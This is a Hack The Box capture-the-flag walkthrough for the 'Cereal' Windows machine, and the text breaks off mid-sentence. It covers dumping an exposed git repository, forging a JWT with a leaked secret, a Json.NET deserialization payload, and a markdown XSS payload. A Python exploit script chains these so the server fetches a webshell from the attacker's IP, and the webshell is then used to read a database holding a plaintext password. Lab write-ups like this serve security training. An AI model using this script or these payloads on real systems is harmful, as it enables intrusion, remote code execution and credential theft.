@@ -1,0 +1,1280 @@
+Cereal - HTB - Windows Hard - Web Server Running .Net App, Derialization filters easy gadget chain to download files. 
+CSS Vulnerability
+
+Open Ports: 22, 80, 443
+IIS for both web servers, we find two hostnames
+
+Will run nmap gain with updated hostnames which may create new output
+
+DNS:cereal.htb, DNS:source.cereal.htb
+
+Going to the web page we encounter an error.
+http://source.cereal.htb/
+Commands and Output:
+=====================================================================================================================================
+Exposes source of where application is running
+Source File: c:\inetpub\source\default.aspx    Line: 3
+=====================================================================================================================================
+
+We take a note of this and also find the version of .net that the application is running.
+Commands and Output:
+=====================================================================================================================================
+Version Information: Microsoft .NET Framework Version:4.0.30319; ASP.NET Version:4.7.3690.0
+=====================================================================================================================================
+
+We now go to https://cereal.htb/login
+and get a login prompt we can try basics account names and passwords to see if we get in, but to no avail.
+
+We can now run gobuster on the source dns name and see if we get anything.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/cereal]
+└──╼ $gobuster dir -k -u https://source.cereal.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster-root.log 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://source.cereal.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/06/08 14:25:04 Starting gobuster in directory enumeration mode
+===============================================================
+/aspnet_client        (Status: 301) [Size: 163] [--> https://source.cereal.htb/aspnet_client/]
+/uploads              (Status: 301) [Size: 157] [--> https://source.cereal.htb/uploads/]      
+/.                    (Status: 500) [Size: 10090]                                             
+/Uploads              (Status: 301) [Size: 157] [--> https://source.cereal.htb/Uploads/]      
+/.git                 (Status: 301) [Size: 154] [--> https://source.cereal.htb/.git/]
+=====================================================================================================================================
+
+We end up finding a .git directory in the source domain name 
+https://source.cereal.htb/.git/
+
+However we get 403 error, but this does not mean we can further enumerarate we can still access items with the directory if we know
+the names.
+
+We can run a tools like the git dumper, just install requirements.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/opt]
+└──╼ $git clone https://github.com/arthaud/git-dumper.git
+┌─[✗]─[user@parrot-virtual]─[/opt/git-dumper]
+└──╼ $pip install -r requirements.txt
+=====================================================================================================================================
+
+NOW running the tool
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/opt/git-dumper]
+└──╼ $python3 git_dumper.py https://source.cereal.htb/.git/ /home/user/htb/cereal/source
+=====================================================================================================================================
+
+WE get the following output
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/cereal/source]
+└──╼ $ls
+ApplicationOptions.cs         CerealContext.cs  Controllers          IPAddressHandler.cs  Models      Properties
+appsettings.Development.json  Cereal.csproj     DownloadHelper.cs    IPRequirement.cs     Pages       Services
+appsettings.json              ClientApp         ExtensionMethods.cs  Migrations           Program.cs  Startup.cs
+=====================================================================================================================================
+
+If we do git log we get alist of all commits including security fixes in the log history
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/cereal/source]
+└──╼ $git log
+commit 34b68232714f841a274050591ff5595dcf7f85da (HEAD -> master)
+Author: Sonny <sonny@cere.al>
+Date:   Tue Jan 7 17:19:04 2020 -0600
+
+    Some changes
+
+commit 3a23ffe921530036a4e0c355e6c8d1d4029cb728
+Author: Sonny <sonny@cere.al>
+Date:   Thu Nov 14 21:45:55 2019 -0600
+
+    Image updates
+
+commit 7bd9533a2e01ec11dfa928bd491fe516477ed291
+Author: Sonny <sonny@cere.al>
+Date:   Thu Nov 14 21:40:06 2019 -0600
+
+    Security fixes
+
+commit 8f2a1a88f15b9109e1f63e4e4551727bfb38eee5
+Author: Count Chocula <chocula@cere.al>
+Date:   Thu Nov 14 21:37:50 2019 -0600
+
+    CEREAL!!
+=====================================================================================================================================
+
+We can even do a git show on a specific commit to see the differences
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/cereal/source]
+└──╼ $git show 7bd9533a2e01ec11dfa928bd491fe516477ed291
+..
+..
+..
++++ b/Services/UserService.cs
+@@ -30,7 +30,7 @@ namespace Cereal.Services
+ 
+                 // authentication successful so generate jwt token
+                 var tokenHandler = new JwtSecurityTokenHandler();
+-                var key = Encoding.ASCII.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf");
++                var key = Encoding.ASCII.GetBytes("****");
+                 var tokenDescriptor = new SecurityTokenDescriptor
+                 {
+                     Subject = new ClaimsIdentity(new Claim[]
+diff --git a/Startup.cs b/Startup.cs
+..
+..
+..
+
+=====================================================================================================================================
+
+And we find a secret encoded key within it which may be useful down the road.
+
+We can use vscodium to analyze the C# code within the application on linux
+
+We want to look at the JWT which is in: Services/UserService.cs
+Looking at the code we see that the application is using the ClaimsIdentity function to process the JWT token 
+We copy the following code from the file and will use windows box with visual studio installed adn we will choose a dotnet app.
+Commands and Output:
+=====================================================================================================================================
+              var tokenHandler = new JwtSecurityTokenHandler();
+                var key = Encoding.ASCII.GetBytes("****");
+                var tokenDescriptor = new SecurityTokenDescriptor
+                {
+                    Subject = new ClaimsIdentity(new Claim[]
+                    {
+                        new Claim(ClaimTypes.Name, user.UserId.ToString())
+                    }),
+                    Expires = DateTime.UtcNow.AddDays(7),
+                    SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
+                };
+                var token = tokenHandler.CreateToken(tokenDescriptor);
+                user.Token = tokenHandler.WriteToken(token);
+=====================================================================================================================================
+
+We create a new project solution and debug and add missing package such as
+Commands and Output:
+=====================================================================================================================================
+C:\Users\commando\source\repos\cereal\cereal>dotnet add package System.IdentityModel.Tokens.Jwt --version 6.11.1
+C:\Users\commando\source\repos\cereal\cereal>dotnet add package Microsoft.Extensions.Options --version 5.0.0
+=====================================================================================================================================
+
+If you encounter an error with the variable 'user' just change it to a '1'.
+
+The new repurposed code should look something like this
+Commands and Output:
+=====================================================================================================================================
+using System;
+using System.Collections.Generic;
+using System.IdentityModel.Tokens.Jwt;
+using System.Linq;
+using System.Security.Claims;
+using System.Text;
+using Microsoft.Extensions.Options;
+using Microsoft.IdentityModel.Tokens;
+
+namespace cereal
+{ 
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            var tokenHandler = new JwtSecurityTokenHandler();
+            var key = Encoding.ASCII.GetBytes("****");
+            var tokenDescriptor = new SecurityTokenDescriptor
+            {
+                Subject = new ClaimsIdentity(new Claim[]
+                {
+                        new Claim(ClaimTypes.Name, "1")
+                }),
+                Expires = DateTime.UtcNow.AddDays(7),
+                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
+            };
+            var token = tokenHandler.CreateToken(tokenDescriptor);
+            var jwt = tokenHandler.WriteToken(token);
+
+            Console.WriteLine(jwt);
+        }
+    }
+}
+=====================================================================================================================================
+
+The final thing to do before building the c# project is to replace the '****' with the jwt secret token
+Commands and Output:
+=====================================================================================================================================
+using System;
+using System.Collections.Generic;
+using System.IdentityModel.Tokens.Jwt;
+using System.Linq;
+using System.Security.Claims;
+using System.Text;
+using Microsoft.Extensions.Options;
+using Microsoft.IdentityModel.Tokens;
+
+namespace cereal
+{ 
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            var tokenHandler = new JwtSecurityTokenHandler();
+            var key = Encoding.ASCII.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf");
+            var tokenDescriptor = new SecurityTokenDescriptor
+            {
+                Subject = new ClaimsIdentity(new Claim[]
+                {
+                        new Claim(ClaimTypes.Name, "1")
+                }),
+                Expires = DateTime.UtcNow.AddDays(7),
+                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
+            };
+            var token = tokenHandler.CreateToken(tokenDescriptor);
+            var jwt = tokenHandler.WriteToken(token);
+
+            Console.WriteLine(jwt);
+        }
+    }
+}
+=====================================================================================================================================
+
+The following is the output. In reference to the '1' being used as the user. The admin user will most likely being the 1 user if not
+we could try other numbers in case if our token does not work as we will see next.
+Commands and Output:
+=====================================================================================================================================
+C:\Users\commando\source\repos\cereal\cereal\bin\Release\netcoreapp3.1>.\cereal.exe
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2MjMxOTQyMjEsImV4cCI6MTYyMzc5OTAyMSwiaWF0IjoxNjIzMTk0MjIxfQ.CKsvmda77cdmn6i_GnggUZQ-F7JHfvZ1ebJ9wruGRFE
+=====================================================================================================================================
+
+We can examine the contents by breaking the components so that we can see them in plain text
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/cereal/source]
+└──╼ $echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2MjMxOTQyMjEsImV4cCI6MTYyMzc5OTAyMSwiaWF0IjoxNjIzMTk0MjIxfQ.CKsvmda77cdmn6i_GnggUZQ-F7JHfvZ1ebJ9wruGRFE' | base64 -d
+{"alg":"HS256","typ":"JWT"}base64: invalid input
+
+..
+..
+..
+└──╼ $echo -n 'eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2MjMxOTQyMjEsImV4cCI6MTYyMzc5OTAyMSwiaWF0IjoxNjIzMTk0MjIxfQ.CKsvmda77cdmn6i_GnggUZQ-F7JHfvZ1ebJ9wruGRFE' | base64 -d
+{"unique_name":"1","nbf":1623194221,"exp":1623799021,"iat":1623194221}base64: invalid input
+=====================================================================================================================================
+
+We can create tokens and modify their expiration times if we wanted to as well. Unique name is user name. NBF is not before in epoch 
+time, exp is expliration, iat is when the token is issued time wise.
+
+All of this was done in order to take advanatge of an authorization bearer token. We can do this by intercepting through burp and
+modifying the request.
+
+Most of the vulnerabilty we will look at relies on react and the javascript code being used.
+We will use firefox web developer tools, we can look at the main logn page and within the the the debugger in the js folder we can
+see the auth header.js file which has the bearer flag we will be using
+Commands and Output:
+=====================================================================================================================================
+import { authenticationService } from '../_services';
+
+export function authHeader() {
+    // return authorization header with jwt token
+    const currentUser = authenticationService.currentUserValue;
+    if (currentUser && currentUser.token) {
+        return { Authorization: `Bearer ${currentUser.token}`, 'Content-Type': 'application/json' };
+    } else {
+        return {};
+    }
+
+=====================================================================================================================================
+
+This also tells us to switch application content type to json. We also have to look at where current user value is stored which will
+based on the "from" will be in the services folder in the 'authentication.service.js' file
+Commands and Output:
+=====================================================================================================================================
+import { BehaviorSubject } from 'rxjs';
+import { handleResponse } from '../_helpers';
+
+const currentUserSubject = new BehaviorSubject(JSON.parse(localStorage.getItem('currentUser')));
+=====================================================================================================================================
+
+We then in web developer take a look at our storage tab and look at local storage we will create a new value called "currentUser"
+and add the jwt token we just created as follows
+Commands and Output:
+=====================================================================================================================================
+Key:
+currentUser
+
+Value:
+{"user":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2MjMxOTQyMjEsImV4cCI6MTYyMzc5OTAyMSwiaWF0IjoxNjIzMTk0MjIxfQ.CKsvmda77cdmn6i_GnggUZQ-F7JHfvZ1ebJ9wruGRFE"}
+=====================================================================================================================================
+
+Which is the json conent we were specified to create for the bearer authorzation to work.
+When we reload and add a request we automcatically cause it prompt us to enter creds again. This is where we now use burp to 
+intercept the request.
+Based on the output we come to find that the bearer token is not speicifed hence why every request fails
+Commands and Output:
+=====================================================================================================================================
+POST /requests HTTP/2
+Host: cereal.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://cereal.htb/
+Content-Type: text/plain;charset=UTF-8
+Origin: https://cereal.htb
+Content-Length: 99
+Dnt: 1
+Sec-Gpc: 1
+Te: trailers
+Connection: close
+
+{"json":"{\"title\":\"test\",\"flavor\":\"pizza\",\"color\":\"#152314\",\"description\":\"test\"}"}
+=====================================================================================================================================
+
+We add the bearer token
+Commands and Output:
+=====================================================================================================================================
+POST /requests HTTP/2
+Host: cereal.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://cereal.htb/
+Content-Type: text/plain;charset=UTF-8
+Origin: https://cereal.htb
+Content-Length: 99
+Dnt: 1
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2MjMxOTQyMjEsImV4cCI6MTYyMzc5OTAyMSwiaWF0IjoxNjIzMTk0MjIxfQ.CKsvmda77cdmn6i_GnggUZQ-F7JHfvZ1ebJ9wruGRFE
+Sec-Gpc: 1
+Te: trailers
+Connection: close
+
+
+{"json":"{\"title\":\"test\",\"flavor\":\"pizza\",\"color\":\"#152314\",\"description\":\"test\"}"}
+=====================================================================================================================================
+
+The reponse now being something like this
+Commands and Output:
+=====================================================================================================================================
+HTTP/2 415 Unsupported Media Type
+Content-Type: application/problem+json; charset=utf-8
+Server: Microsoft-IIS/10.0
+Strict-Transport-Security: max-age=2592000
+X-Rate-Limit-Limit: 5m
+X-Rate-Limit-Remaining: 5
+X-Rate-Limit-Reset: 2021-06-09T00:56:18.6368276Z
+X-Powered-By: Sugar
+Date: Wed, 09 Jun 2021 00:51:18 GMT
+Content-Length: 147
+
+{"type":"https://tools.ietf.org/html/rfc7231#section-6.5.13","title":"Unsupported Media Type","status":415,"traceId":"|fde42237-446391adabecae60."}
+=====================================================================================================================================
+
+We have to change content type to "application/json" in order for the bearer request to work if go back and look at the javascript folder
+data.
+Commands and Output:
+=====================================================================================================================================
+POST /requests HTTP/2
+Host: cereal.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://cereal.htb/
+Content-Type: application/json
+Origin: https://cereal.htb
+Content-Length: 99
+Dnt: 1
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2MjMxOTQyMjEsImV4cCI6MTYyMzc5OTAyMSwiaWF0IjoxNjIzMTk0MjIxfQ.CKsvmda77cdmn6i_GnggUZQ-F7JHfvZ1ebJ9wruGRFE
+Sec-Gpc: 1
+Te: trailers
+Connection: close
+
+{"json":"{\"title\":\"test\",\"flavor\":\"pizza\",\"color\":\"#152314\",\"description\":\"test\"}"}
+=====================================================================================================================================
+
+The following response follows:
+Commands and Output:
+=====================================================================================================================================
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+Server: Microsoft-IIS/10.0
+Strict-Transport-Security: max-age=2592000
+X-Rate-Limit-Limit: 5m
+X-Rate-Limit-Remaining: 5
+X-Rate-Limit-Reset: 2021-06-09T01:11:37.9940333Z
+X-Powered-By: Sugar
+Date: Wed, 09 Jun 2021 01:06:38 GMT
+Content-Length: 42
+
+{"message":"Great cereal request!","id":9}
+=====================================================================================================================================
+
+Now that we have successful requests being made we want to find a way to execute code.
+
+If we examined the previous code commits by using the git show command with security commits we found the following 
+Commands and Output:
+=====================================================================================================================================
++++ b/Controllers/RequestsController.cs
+..
+..
+..
+ // Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial
+=====================================================================================================================================
+
+This indicate we will have to come up with a custom way of bypassing this to get code execution.
+If we look at the new code ins RequestsController.cs we can see that we can the is a restircition of which IPs we can use as well as 
+the custom code to tprevent desrialization attacks
+Commands and Output:
+=====================================================================================================================================
+                string json = db.Requests.Where(x => x.RequestId == id).SingleOrDefault().JSON;
+                // Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial
+                if (json.ToLower().Contains("objectdataprovider") || json.ToLower().Contains("windowsidentity") || json.ToLower().Contains("system"))
+                {
+                    return BadRequest(new { message = "The cereal police have been dispatched." });
+                }
+=====================================================================================================================================
+
+This is just a bandaid, we will now for a way to this ourselves, since we can't use ysoserial. Create our own serialization payload.
+Type of json library being used.
+Newtonsoft JSON, we will now look at how to exploit the derserialization that is currently ongoing.
+It basically uses "Json.NET" we can google blackhat json desrialization, we get the following:
+https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
+
+We can copy snippets of code found it the following section
+Commands and Output:
+=====================================================================================================================================
+.NET RCE Gadgets
+System.Configuration.Install.AssemblyInstaller
+Sample JSON payload:
+{"$type":"System.Configuration.Install.AssemblyInstaller,
+System.Configuration.Install, Version=4.0.0.0, Culture=neutral,
+PublicKeyToken=b03f5f7f11d50a3a",
+"Path":"file:///c:/somePath/MixedLibrary.dll"}
+=====================================================================================================================================
+
+We now have to find some dangerous things in the source folder, one potential vector is the Download helper function in DonwloadHelper.cs
+which is not really used by the application.
+Commands and Output:
+=====================================================================================================================================
+{
+	'$type':'Cereal.DownloadHelper, Cereal', 
+	'URL' : 'http://10.10.14.28/cmd.aspx'
+	'FilePath': 'C:/inetpub/source/cmd.aspx',
+}
+=====================================================================================================================================
+
+The issue now comes back to if we can actually execute the fucntion since there is RestirctIP policy, if we further investigate
+if we go back to vscodium and hit contro+shift+f we can search trhough all files the 'RestrictIP' string
+
+We find it in StartUp.cs, which in turn uses 'applicatonOptions' we search for that as well. And in appsettngs.json we see that all
+ips are blacklisted with the exception of '127.0.0.1'
+
+We can't hit the endpoint of getid. We need cross site scripting attack to try and get someone to make the request locally on our behalf.
+
+So we go back through the code and analyze anything that could be exploited.
+
+We look at the app.jsx code and find the routes
+Commands and Output:
+=====================================================================================================================================
+       <Router history={history}>
+                <div className="jumbotron" >
+                    <div className="container">
+                        <div className="row">
+                            <div className="col-md-6 offset-md-3">
+                                <PrivateRoute exact path="/" component={HomePage} />
+                                <PrivateRoute path="/admin" component={AdminPage} />
+                                <Route path="/login" component={LoginPage} />
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </Router>
+=====================================================================================================================================
+
+https://cereal.htb/admin/
+We take a look at the /admin page, we make sure to have burp running so that the javascript runs while the request to the server gets
+delayed and we observe that there is a "Current cereal requests:" output returned by the js. 
+
+Some type of user simulation may hit that page. If page is vulnerable to cross sie scripting, and we can create a serial request with 
+a redirect we can then hit the page from localhost as long as the user simulation is happening on localhost.
+
+We see that javascript code again in vscodium and in AdminPage.jsx
+We find the hard piece of the box and that is that the following code in that jsx file is out of date and vulnerable to cross site 
+scripting.
+Commands and Output:
+=====================================================================================================================================
+import React from 'react';
+import { MarkdownPreview } from 'react-marked-markdown';
+=====================================================================================================================================
+
+We can verify this by using npm audit.
+Commands and Output:
+=====================================================================================================================================
+
+135 vulnerabilities (9 low, 93 moderate, 32 high, 1 critical)
+
+=====================================================================================================================================
+
+There is a lot to go through, a lot maybe false positives and may not be exploitable.
+Going down through the list we find the react vulnerability which has no fix
+Commands and Output:
+=====================================================================================================================================
+react-marked-markdown  *
+Severity: high
+Cross-Site Scripting - https://npmjs.com/advisories/668
+Depends on vulnerable versions of enzyme
+No fix available
+node_modules/react-marked-markdown
+=====================================================================================================================================
+
+Digging through it the module has not been updated for 5 years, we find a payload we can maybe exploit in the advisory however we 
+will modify to see if we can get web request to a webserver we create.
+
+We put the request in the "Title:" and see if we get any hits, we first intercept the request with burp.
+Commands and Output:
+=====================================================================================================================================
+{"json":"{\"title\":\"[XSS](javascript: document.write`<img src=http://10.10.14.28/test />`)\",\"flavor\":\"pizza\",\"color\":\"#FFF\",\"description\":\"test\"}"}
+..
+..
+..
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/cereal/source]
+└──╼ $sudo nc -lnvp 80
+[sudo] password for user: 
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.10.217.
+Ncat: Connection from 10.10.10.217:50769.
+GET /test HTTP/1.1
+Host: 10.10.14.28
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+=====================================================================================================================================
+
+Now the tough part, we have to create something to exploit this. Python script will be necessary.
+Commands and Output:
+=====================================================================================================================================
+1. Create JWT token, got secret from git commit
+2. Store desrialization payload on the server by posting to /requests
+3. Send XSS Redirect to trick admins browser to hit our desrialization which bypasses restrictIP
+4. ... Wait for admin to hit our xss 
+5. Server Downloads our webshell.
+=====================================================================================================================================
+
+We create the following code that will make requests that will enable us to upload an aspx file that allows us to execute commands on 
+the server.
+Commands and Output:
+=====================================================================================================================================
+#!/usr/bin/env python3
+
+import jwt
+import requests
+import sys
+from datetime import datetime, timedelta
+from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+
+# Get args
+try:
+    target = sys.argv[1]
+    url = sys.argv[2]
+    saveas = sys.argv[3]
+except IndexError:
+    print(f'Usage: {sys.argv[0]} [target ip/domain] [url to upload] [filename on target]')
+    sys.exit()
+
+
+# Forge JWT
+print('[*] Forging JWT token')
+token = jwt.encode({'name': "1", "exp": datetime.utcnow() + timedelta(days=7)}, 'secretlhfIH&FY*#oysuflkhskjfhefesf', algorithm="HS256")
+headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
+
+# Send DownloadHelper object as JSON
+print('[*] Sending DownloadHelper serialized object')
+serial_payload = {"json": "{'$type':'Cereal.DownloadHelper, Cereal','URL':'" + url + "','FilePath': 'C:\\\\inetpub\\\\source\\\\uploads\\\\" + saveas + "'}"} 
+resp = requests.post(f'https://{target}/requests', json=serial_payload, headers=headers, verify=False)
+if resp.status_code != 200:
+    print(f'[-] Something went wrong: {resp.text}')
+    sys.exit()
+serial_id = resp.json()['id']
+print(f'[+] Object uploaded: {resp.text}')
+
+# Send XSS payload
+print('[*] Sending XSS payload')
+#xss_payload = {"json":'{"title":"[XSS](javascript: document.write%28%27<img src=%22http://10.10.14.14/onelasttest.png%22 />%27%29)","flavor":"sushi","color":"#FFF","description":"asd"}'}
+#xss_payload = {"json":"{\"title\":\"[XSS](javascript: document.write%28%22<script>window.location = 'http://10.10.14.14/location2';</script>%22%29)\",\"flavor\":\"bacon\",\"color\":\"#FFF\",\"description\":\"\"}"}
+xss_payload = {"json":"{\"title\":\"[XSS](javascript: document.write%28%22<script>var xhr = new XMLHttpRequest;xhr.open%28'GET', 'https://"+ target + "/requests/" + str(serial_id)+"', true%29;xhr.setRequestHeader%28'Authorization','Bearer "+token+"'%29;xhr.send%28null%29</script>%22%29)\",\"flavor\":\"pizza\",\"color\":\"#FFF\",\"description\":\"test\"}"}
+resp = requests.post(f'https://{target}/requests', json=xss_payload, headers=headers, verify=False)
+if resp.status_code != 200:
+    print('[-] Something went wrong: {resp.text}')
+    sys.exit()
+print(f'[+] XSS payload sent: {resp.text}')
+=====================================================================================================================================
+
+One thing to note is that the uploaded file is prefixed with the following string in the uploads directory: "21098374243-"
+The file that has this string in in the "DownloadHelper.cs" file.
+Commands and Output:
+=====================================================================================================================================
+     private void Download()
+        {
+            using (WebClient wc = new WebClient())
+            {
+                if (!string.IsNullOrEmpty(_URL) && !string.IsNullOrEmpty(_FilePath))
+                {
+                    wc.DownloadFile(_URL, ReplaceLastOccurrence(_FilePath,"\\", "\\21098374243-"));
+                }
+=====================================================================================================================================
+
+We can now execute the script as follows
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/cereal]
+└──╼ $python3 cereal-rce.py cereal.htb http://10.10.14.28/cmd.aspx cmd.aspx
+[*] Forging JWT token
+[*] Sending DownloadHelper serialized object
+[+] Object uploaded: {"message":"Great cereal request!","id":11}
+[*] Sending XSS payload
+[+] XSS payload sent: {"message":"Great cereal request!","id":12}
+=====================================================================================================================================
+
+And now we can navigate to "https://source.cereal.htb/uploads/21098374243-cmd.aspx" and issue commands.
+
+One of the first things you want to do when you gain access to a webserver is to look at the databse file which may have creds that
+could be potentially used on the box. To get these credentials we simply have to navigat to the inetpub directory and list all 
+available file that we may have access to.
+
+The database folder is most likley in the following directory if we kept querying with dir.
+Commands and Output:
+=====================================================================================================================================
+dir c:\inetpub\cereal
+Volume in drive C has no label.
+ Volume Serial Number is C4EF-2153
+
+ Directory of c:\inetpub\cereal
+
+11/11/2020  01:10 PM    <DIR>          .
+11/11/2020  01:10 PM    <DIR>          ..
+11/11/2020  01:09 PM            19,208 api-ms-win-core-console-l1-1-0.dll
+11/11/2020  01:09 PM            18,696 api-ms-win-core-datetime-l1-1-0.dll
+11/11/2020  01:09 PM            18,696 api-ms-win-core-debug-l1-1-0.dll
+11/11/2020  01:09 PM            18,696 api-ms-win-core-errorhandling-l1-1-0.dll
+11/11/2020  01:09 PM            22,280 api-ms-win-core-file-l1-1-0.dll
+11/11/2020  01:09 PM            18,696 api-ms-win-core-file-l1-2-0.dll
+11/11/2020  01:09 PM            18,696 api-ms-win-core-file-l2-1-0.dll
+..
+..
+..
+
+11/11/2020  01:33 PM    <DIR>          db
+11/11/2020  01:09 PM           136,064 dbgshim.dll
+11/11/2020  01:09 PM    <DIR>          de
+11/11/2020  01:09 PM            95,232 dotnet-aspnet-codegenerator-design.dll
+
+..
+..
+..
+
+11/11/2020  01:09 PM    <DIR>          es
+11/11/2020  01:09 PM         1,276,928 e_sqlite3.dll
+11/11/2020  01:09 PM    <DIR>          fr
+11/11/2020  01:09 PM           595,328 hostfxr.dll
+11/11/2020  01:09 PM           589,184 hostpolicy.dll
+11/11/2020  01:10 PM            13,312 System.Composition.AttributedModel.dll
+11/11/2020  01:10 PM           103,936 System.Composition.Convention.dll
+11/11/2020  01:10 PM           107,008 System.Composition.Hosting.dll
+11/11/2020  01:10 PM            26,624 System.Composition.Runtime.dll
+11/11/2020  01:10 PM         1,016,584 ucrtbase.dll
+11/11/2020  01:10 PM               869 web.config
+11/11/2020  01:10 PM    <DIR>          zh-Hans
+11/11/2020  01:10 PM    <DIR>          zh-Hant
+             326 File(s)    114,486,101 bytes
+              17 Dir(s)   7,108,743,168 bytes free
+
+
+
+=====================================================================================================================================
+
+The database most likley in the db directory
+Commands and Output:
+=====================================================================================================================================
+dir c:\inetpub\cereal\db
+ Volume in drive C has no label.
+ Volume Serial Number is C4EF-2153
+
+ Directory of c:\inetpub\cereal\db
+
+06/09/2021  08:59 PM    <DIR>          .
+06/09/2021  08:59 PM    <DIR>          ..
+06/09/2021  08:59 PM            24,576 cereal.db
+               1 File(s)         24,576 bytes
+               2 Dir(s)   7,142,858,752 bytes free
+
+=====================================================================================================================================
+
+We can use 'type' to output the file into the web browser.
+Commands and Output:
+=====================================================================================================================================
+SQLite format 3@  .4 
+øêÆ­
+¾êQƒtableUsersUsersCREATE TABLE "Users" (
+	"UserId"	INTEGER NOT NULL,
+	"Username"	TEXT NOT NULL,
+	"Password"	TEXT NOT NULL,
+	"Token"	TEXT,
+	CONSTRAINT "PK_Users" PRIMARY KEY("UserId" AUTOINCREMENT)
+)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)3‚9tableRequestsRequestsCREATE TABLE "Requests" (
+	"RequestId"	INTEGER NOT NULL,
+	"JSON"	TEXT NOT NULL,
+	CONSTRAINT "PK_Requests" PRIMARY KEY("RequestId" AUTOINCREMENT)
+)d77‚gtable__EFMigrationsHistory__EFMigrationsHistoryCREATE TABLE "__EFMigrationsHistory" (
+	"MigrationId"	TEXT NOT NULL,
+	"ProductVersion"	TEXT NOT NULL,
+	CONSTRAINT "PK___EFMigrationsHistory" PRIMARY KEY("MigrationId")
+)I]7indexsqlite_autoindex___EFMigrationsHistory_1__EFMigrationsHistory
+ÚÚ$E20191105055735_InitialCreate3.0.0
+ààE	20191105055735_InitialCreate
+ø
+[Ô‰†9{"title":"[XSS](javascript: document.write%28%22<script>var xhr = new XMLHttpRequest;xhr.open%28'GET', 'https://cereal.htb/requests/11', true%29;xhr.setRequestHeader%28'Authorization','Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiMSIsImV4cCI6MTYyMzkwMTg2NX0.RxasXCeBZoeODP-oDKOOXqPvegsdQrS36f8870V7t0E'%29;xhr.send%28null%29</script>%22%29)","flavor":"pizza","color":"#FFF","description":"test"}‰‚{'$type':'Cereal.DownloadHelper, Cereal','URL':'http://10.10.14.28/cmd.aspx','FilePath': 'C:\\inetpub\\source\\uploads\\cmd.aspx'}{'$type': 'Cereal.DownloadHelper, Cereal', 'URL': 'http://10.10.14.28/cmd.aspx','FilePath': 'C:/inetpub/source/cmd.aspx'}
+èöèRequests	Users
+ÛÛ#?sonnymutual.madden.manner38974
+=====================================================================================================================================
+
+It is not too legible so we can instead copy the file to the root of the webserver and download from there.
+Commands and Output:
+=====================================================================================================================================
+copy c:\inetpub\cereal\db\cereal.db c:\inetpub\source\uploads
+=====================================================================================================================================
+
+However when we go and try and download it, we get 404, what is most likely happening is that iis is blocking users from downloading 
